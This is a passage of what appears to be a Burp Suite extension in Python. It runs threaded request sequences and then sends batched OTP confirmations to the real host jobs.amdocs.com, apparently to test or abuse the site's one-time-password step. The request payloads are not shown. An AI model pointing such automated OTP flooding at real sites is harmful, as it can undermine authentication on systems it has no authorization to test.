                    def thread_worker_phase1(start_iter, count, tid):
                        try:
                            for i in range(count):
                                if not self.is_running:
                                    break
                                iter_num = start_iter + i
                                self.statusLabel.setText("Status: Phase 1 (Thread " + str(tid + 1) + ", Iteration " + str(iter_num) + "/" + str(self.repeat_count) + ")")
                                self.execute_phase1_for_iteration(iter_num, self.repeat_count)
                                if i < count - 1:
                                    time.sleep(0.5)
                        except Exception as e:
                            self.log("Error in thread " + str(tid) + " Phase 1: " + str(e), force=True)
                    
                    thread = threading.Thread(target=thread_worker_phase1, args=(iteration, thread_iterations, thread_id))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                    iteration += thread_iterations
                
                # Wait for ALL threads to complete Phase 1
                self.log("Waiting for all threads to complete Phase 1...", force=True)
                for thread in threads:
                    thread.join()
            
            if not self.is_running:
                return
            
            # PHASE 2: Execute OTP confirmations ONCE for all collected flows
            self.log("=== All Phase 1 completed. Total flows collected: " + str(len(self.all_flows)) + " ===", force=True)
            self.statusLabel.setText("Status: Phase 2 - Sending OTP confirmations")
            self.execute_phase2_all_flows()
            
            self.log("=== All phases completed ===", force=True)
        except Exception as e:
            self.log("Error in execute_full_sequence: " + str(e), force=True)
            import traceback
            self.log(traceback.format_exc(), force=True)
        finally:
            self.is_running = False
            self.startButton.setText("Start")
            self.pauseButton.setEnabled(False)
            self.pauseButton.setText("Pause")
            self.statusLabel.setText("Status: Completed")
            self.log("=== Request Sequence Completed ===", force=True)

    def make_request(self, headers, body):
        """Build and send HTTP request"""
        try:
            # Build the request message
            request_bytes = self.helpers.buildHttpMessage(
                [h.encode('utf-8') for h in headers],
                body.encode('utf-8') if body else None
            )
            
            # Create HTTP service
            http_service = self.helpers.buildHttpService("jobs.amdocs.com", 443, True)
            
            # Send the request
            self.log("Sending request to: " + headers[0])
            response = self.callbacks.makeHttpRequest(http_service, request_bytes)
            
            if response:
                # Ensure response is bytes
                if hasattr(response, 'getResponse'):
                    response = response.getResponse()
                elif not isinstance(response, (bytes, bytearray)):
                    # Convert to bytes if needed
                    try:
                        response = bytes(response)
                    except:
                        pass
            else:
                self.log("WARNING: No response received", force=True)
            
            return response
        except Exception as e:
            self.log("Error making request: " + str(e))
            import traceback
            self.log(traceback.format_exc())
            return None
